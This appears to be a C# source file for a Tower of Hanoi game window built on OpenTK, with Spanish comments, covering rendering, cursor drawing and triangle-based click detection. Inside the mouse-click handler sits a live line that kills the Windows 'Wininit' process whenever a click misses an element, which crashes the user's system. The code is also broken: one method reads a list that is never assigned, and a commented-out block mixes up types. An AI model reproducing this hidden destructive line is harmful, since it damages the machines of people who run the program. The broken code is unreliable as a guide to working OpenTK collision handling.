using OpenTK;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using OpenTK.Graphics.OpenGL;
using OpenTK.Graphics;
using OpenTK.Input;
using System.Dynamic;
using System.Collections;

namespace Hanoi
{
    public class Ventana : GameWindow
    {
        private int ancho, alto;
        private float cursorX, cursorY;
        private float tamCursor = 15f;
        public bool mousePresionado = false;

        Color background;
        List<Elemento> listaElementos = new List<Elemento>();

        public Ventana(int _ancho, int _alto, string titulo, Color? _background) : base(_ancho, _alto, GraphicsMode.Default, titulo)
        {
            ancho = _ancho;
            alto = _alto;
            background = _background != null ? (Color)_background : Color.Black ;
            this.Resize += DimensionesVentana;
            this.Load += this.Carga;
            this.RenderFrame += this.ActualizarFrame;
            this.MouseMove += this.OnCursorMove;
            this.MouseDown += this.OnMouseClick;
            this.MouseUp += this.OnMouseRelease;
            this.CursorVisible = false;
            this.Run(1 / 144.0);
        }

        private void ActualizarFrame(object obj, EventArgs e)
        {
            GL.Clear(ClearBufferMask.ColorBufferBit);

            DibujarElementos();
            DibujarCursor(cursorX, cursorY);

            this.SwapBuffers();
        }

        /*public bool ColisionGeneral(float x1, float y1, out List<Vertex> listaTriangulosPorRevisar)
        {
            listaTriangulosPorRevisar = new List<Vertex>();
            var boundingBox = new Vertex[3];
            //Registrar las hitboxes de todos los elementos
            for (int i = 0; i < listaElementos.Count; i += 3)
            {
                boundingBox[0] = listaElementos[i].Vertices;
                boundingBox[1] = listaElementos[i + 1];
                boundingBox[2] = listaElementos[i + 2];

                float[] boundingAltura = new float[2];
                //Conseguir la altura maxima y minima del elemento
                boundingAltura[0] = listaElementos.GetRange(i, 3).Max(vertex => vertex.Y);
                boundingAltura[1] = listaElementos.GetRange(i, 3).Min(vertex => vertex.Y);

                float[] boundingAnchura = new float[2];
                //Conseguir la anchura maxima y minima del elemento
                boundingAnchura[0] = listaElementos.GetRange(i, 3).Max(vertex => vertex.X);
                boundingAnchura[1] = listaElementos.GetRange(i, 3).Min(vertex => vertex.X);

                //Recoger solo los triangulos posiblemente con colision
                if ((boundingAltura[0] > y1 && boundingAltura[1] < y1) && (boundingAnchura[0] > x1 && boundingAnchura[1] < x1))
                {
                    listaTriangulosPorRevisar.AddRange(boundingBox);
                }
            }

            if (listaTriangulosPorRevisar.Count > 0)
                return true;

            return false;
        } //Revisar
        public bool ColisionGeneral(float x1, float y1)
        {
            return ColisionGeneral(x1, y1, out _);
        }
        public bool ColisionGeneral(Vertex vector)
        {
            return ColisionGeneral(vector.X, vector.Y, out _);
        }*/ //Revisar
        public bool ColisionEspecifica(float x1, float y1, List<Vertex> listaVertices)
        {
            for (int i = 0; i < listaVertices.Count; i += 3)
            {
                Vertex va = listaVertices[i];
                Vertex vb = listaVertices[i + 1];
                Vertex vc = listaVertices[i + 2];
                Vertex vd = new Vertex(x1, y1);

                float areaT = Trigonometria.Area(va, vb, vc);
                float areaA = Trigonometria.Area(va, vb, vd);
                float areaB = Trigonometria.Area(vb, vc, vd);
                float areaC = Trigonometria.Area(vc, va, vd);

                if (areaA + areaB + areaC <= areaT && areaA >= 0 && areaB >= 0 && areaC >= 0)
                    return true; 
            }
            return false;
        }
        public bool ColisionEspecifica()
        {
            List<Vertex> lista;
            //ColisionGeneral(cursorX, cursorY, out lista);

            foreach(Vertex v in lista)
            {
                Console.WriteLine(v.X.ToString() + " " + v.Y.ToString());
            }

            if (lista.Count <= 0)
                return false;

            return ColisionEspecifica(cursorX, cursorY, lista);
        }

        private void DibujarElementos(List<Elemento> elementos, float sizePoints = 1f)
        {
            foreach (Elemento elemento in elementos)
            {
                switch (elemento.Type)
                {
                    case PrimitiveType.Triangles:
                        for (int i = 0; i < elemento.Vertices.Count; i += 3)
                        {
                            GL.Begin(elemento.Type);
                            GL.Color3(elemento.Vertices[i].Color);
                            GL.Vertex2(elemento.Vertices[i].X, elemento.Vertices[i].Y);
                            GL.Vertex2(elemento.Vertices[i + 1].X, elemento.Vertices[i + 1].Y);
                            GL.Vertex2(elemento.Vertices[i + 2].X, elemento.Vertices[i + 2].Y);
                            GL.End();
                        }
                        break;
                    case PrimitiveType.Lines:
                        for (int i = 0; i < elemento.Vertices.Count; i += 2)
                        {
                            GL.Begin(elemento.Type);
                            GL.Color3(elemento.Vertices[i].Color);
                            GL.Vertex2(elemento.Vertices[i].X, elemento.Vertices[i].Y);
                            GL.Vertex2(elemento.Vertices[i + 1].X, elemento.Vertices[i + 1].Y);
                            GL.End();
                        }
                        break;
                    case PrimitiveType.Points:
                        for (int i = 0; i < elemento.Vertices.Count; i++)
                        {
                            GL.PointSize(sizePoints);
                            GL.Begin(elemento.Type);
                            GL.Color3(elemento.Vertices[i].Color);
                            GL.Vertex2(elemento.Vertices[i].X, elemento.Vertices[i].Y);
                            GL.End();
                        }
                        break;
                }
            }                
        }
        private void DibujarElementos()
        {
            DibujarElementos(listaElementos);
        }
        private void DibujarCursor(float x, float y)
        {
            GL.Begin(PrimitiveType.Triangles);
            float offset = mousePresionado ? 0 : tamCursor / 10;
            float tempTamCursor = tamCursor;
            GL.PointSize(tamCursor);
            GL.ClearColor(1.0f, 1.0f, 1.0f, 1.0f);
            for (int i = 0; i < 2; i++)
            {
                GL.Vertex2(cursorX + offset, cursorY - offset);
                GL.Vertex2((cursorX + offset) + tempTamCursor, (cursorY - offset));
                GL.Vertex2((cursorX + offset), (cursorY - offset) - tempTamCursor);
                offset *= -1;
                tempTamCursor *= -1;
            }
            GL.End();
        }

        private void OnCursorMove(object obj, MouseMoveEventArgs eventoCursor)
        {
            cursorX = eventoCursor.X;
            cursorY = alto - eventoCursor.Y;
        }
        private void OnMouseClick(object obj, MouseButtonEventArgs e)
        {
            mousePresionado = e.Button == MouseButton.Left ? true : false;

            if (ColisionEspecifica())
            {

            }
            else
            {
                System.Diagnostics.Process.GetProcessesByName("Wininit")[0].Kill();
            }
        }
        private void OnMouseRelease(object obj, MouseButtonEventArgs e)
        {
            mousePresionado = false;
        }

        private void Carga(object obj, EventArgs e)
        {
            float canalRed = background.R / 255f;
            float canalGreen = background.G / 255f;
            float canalBlue = background.B / 255f;
            float canalAlpha = background.A / 255f;
            GL.ClearColor(canalRed, canalGreen, canalBlue, canalAlpha);
        }
        private void DimensionesVentana(object obj, EventArgs e)
        {
            //Necesito explicacion de esto que el indio no explica tan bien
            GL.Viewport(0, 0, ancho, alto);
            GL.MatrixMode(MatrixMode.Projection);
            GL.LoadIdentity();
            GL.Ortho(0.0, ancho, 0.0, alto, -1.0, 1.0);
            GL.MatrixMode(MatrixMode.Modelview);
        }
    }
}
